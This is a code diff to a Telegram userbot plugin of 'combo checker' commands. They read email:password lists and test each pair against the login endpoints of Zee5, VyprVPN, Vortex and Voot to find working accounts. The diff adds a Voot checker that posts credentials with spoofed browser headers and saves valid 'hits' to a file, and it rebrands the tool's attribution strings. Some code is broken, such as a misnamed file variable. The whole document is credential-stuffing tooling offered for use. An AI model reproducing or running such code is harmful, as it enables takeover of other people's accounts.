@@ -20,6 +20,24 @@ data2 = {
     "accept-encoding": "gzip",
     "user-agent": "RemotrAndroid/1.5.0"
 }
+
+
+face = {
+	"Accept-Encoding": "gzip, deflate, br",
+	"Accept-Language": "en-US,en;q=0.9",
+	"Connection": "keep-alive",
+	"Content-Length": "136",
+	"Content-Type": "application/json;charset=UTF-8",
+	"Host": "userauth.voot.com",
+	"Origin": "https://www.voot.com",
+	"Referer": "https://www.voot.com",
+	"Sec-Fetch-Dest": "empty",
+	"Sec-Fetch-Mode": "cors",
+	"Sec-Fetch-Site": "same-site",
+	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.66"
+}
+
+
 @friday.on(friday_on_cmd(pattern="cz5$"))
 async def zee5(event):
     await event.edit('`Checking Your Combos. This May Take Time Depending On No of Combos.`')
@@ -29,10 +47,8 @@ async def zee5(event):
     bads = 0
     lol = await event.get_reply_message()
     starky = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
-    file = open(starky, "r")
-    lines = file.readlines()
-    for line in lines:
-        stark_dict.append(line)
+    with open(starky) as f:
+        stark_dict = f.read().splitlines()
     os.remove(starky)
     if len(stark_dict) > 50:
         await event.edit('`Woah, Thats A Lot Of Combos. Keep 50 As Limit`')
@@ -55,7 +71,7 @@ async def zee5(event):
         return
     with open("hits.txt", "w") as hitfile:
         for s in hits_dict:
-            hitfile.write(s + ' | @FridayOT')
+            hitfile.write(s + ' | @Infinity_Bots')
     await borg.send_file(
         event.chat_id, "hits.txt", caption=f"**!ZEE5 HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`"
     )
@@ -70,10 +86,8 @@ async def vypr(event):
     bads = 0
     lol = await event.get_reply_message()
     starky = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
-    file = open(starky, "r")
-    lines = file.readlines()
-    for line in lines:
-        stark_dict.append(line)
+    with open(starky) as f:
+        stark_dict = f.read().splitlines()
     os.remove(starky)
     if len(stark_dict) > 50:
         await event.edit('`Woah, Thats A Lot Of Combos. Keep 50 As Limit`')
@@ -101,7 +115,7 @@ async def vypr(event):
         return
     with open("hits.txt", "w") as hitfile:
         for s in hits_dict:
-            hitfile.write(s + ' | @FridayOT')
+            hitfile.write(s + ' | @Infinity_Bots')
     await borg.send_file(
         event.chat_id, "hits.txt", caption=f"**!NORD HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`"
     )
@@ -116,10 +130,8 @@ async def vortex(event):
     bads = 0
     lol = await event.get_reply_message()
     starky = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
-    file = open(starky, "r")
-    lines = file.readlines()
-    for line in lines:
-        stark_dict.append(line)
+    with open(starky) as f:
+        stark_dict = f.read().splitlines()
     os.remove(starky)
     if len(stark_dict) > 50:
         await event.edit('`Woah, Thats A Lot Of Combos. Keep 50 As Limit`')
@@ -147,7 +159,7 @@ async def vortex(event):
         return
     with open("hits.txt", "w") as hitfile:
         for s in hits_dict:
-            hitfile.write(s + ' | @FridayOT')
+            hitfile.write(s + ' | @Infinity_Bots')
     await borg.send_file(
         event.chat_id, "hits.txt", caption=f"**!VORTEX HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`"
     )
@@ -162,10 +174,8 @@ async def vortex(event):
     bads = 0
     lol = await event.get_reply_message()
     starky = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
-    file = open(starky, "r")
-    lines = file.readlines()
-    for line in lines:
-        stark_dict.append(line)
+    with open(starky) as f:
+        stark_dict = f.read().splitlines()
     os.remove(starky)
     if len(stark_dict) > 50:
         await event.edit('`Woah, Thats A Lot Of Combos. Keep 50 As Limit`')
@@ -200,7 +210,7 @@ async def vortex(event):
         return
     with open("hits.txt", "w") as hitfile:
         for s in hits_dict:
-            hitfile.write(s + ' | @FridayOT')
+            hitfile.write(s + ' | @Infinity_Bots')
     await borg.send_file(
         event.chat_id, "hits.txt", caption=f"**!VYPR HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`"
     )
@@ -243,11 +253,74 @@ async def _(event):
       await event.edit("Check Failed. Either Your File Has All Bad Proxies Or Your Proxy File Is Invalid.")
     elif Counter>=1:
       file1 = open("goood.txt", "a")
-      file1.write("\nCHECKED BY FRIDAY. GET YOUR OWN FRIDAY FROM @FRIDAYCHAT. ") 
+      file1.write("\nCHECKED BY VirtualUserbot. GET YOUR OWN VirtualUserbot FROM @Infinity_Bots. ") 
       file1.close() 
       await borg.send_file(event.chat_id, "goood.txt", caption=f"**PROXIES CHECKED**\n**GOOD PROXIES: ** {Counter}\n\n**CHECKED BY FRIDAY. GET YOUR OWN FRIDAY FROM @FRIDAYCHAT.**")
       os.remove(escobar)
       os.remove("goood.txt")
+
+
+@friday.on(friday_on_cmd(pattern="cvt$"))
+async def voot(event):
+    await event.edit('`Checking Your Combos. This May Take Time Depending On No of Combos.`')
+    normal_dict = []
+    good_dict = []
+    hits = 0
+    bady = 0
+    lol = await event.get_reply_message()
+    humm = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
+    with open(hummu) as f:
+        normal_dict = f.read().splitlines()
+    os.remove(humm)
+    if len(normal_dict) > 50:
+        await event.edit('`Woah, Thats A Lot Of Combos. Keep 50 As Limit`')
+        return
+    for i in normal_dict:
+        mmho = i.split(":")
+        email = mmho[0]
+        try:
+          password = mmho[1]
+        except IndexError:
+          continue
+        hell = {
+          "type":"traditional",
+	        "deviceId":"Windows NT 10.0",
+	        "deviceBrand":"PC/MAC",
+	        "data":{"email":email, "password":password}}
+        r = requests.post("https://userauth.voot.com/usersV3/v3/login", json=hell, headers=face).json()
+        a = r.get("data")
+
+        kk = r.get("status")
+
+        if a != None:
+            hits += 1
+            good_dict.append(f"{email}:{password}")
+	
+        elif kk != None:
+            bady += 1
+            c = kk.get("code")
+            if c == 1906:
+              await event.edit("voot server is blocking the requests. please try after few minutes...")
+              if len(good_dict) == 0:
+                return
+              with open("hits.txt", "w") as hitfile:
+                for s in good_dict:
+                  hitfile.write(s + ' | @FridayOT')
+                await borg.send_file(event.chat_id, "hits.txt", caption=f"**!VOOT HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bady}`")
+                os.remove("hits.txt")
+                return
+
+    if len(good_dict) == 0:
+        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
+        return
+    with open("hits.txt", "w") as hitfile:
+        for s in good_dict:
+            hitfile.write(s + ' | @Infinity_Bots')
+    await borg.send_file(
+        event.chat_id, "hits.txt", caption=f"**!VOOT HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bady}`"
+    )
+    os.remove("hits.txt")
+
 
 
 CMD_HELP.update(
@@ -257,6 +330,8 @@ CMD_HELP.update(
 \n**Usage :** Checks for Zee5 accounts from combo.\
 \n\n**Syntax : **`.cnd <reply to combo>`\
 \n**Usage :** Checks for VYPR accounts from combo.\
+\n\n**Syntax : **`.cvt <reply to combo>`\
+\n**Usage :** Checks for Voot accounts from combo.\
 \n\n**Syntax : **`.cvx <reply to combo>`\
 \n**Usage :** Checks for Vortex accounts from combo.\
 \n\n**Syntax : **`.cz5 <reply to combo>`\
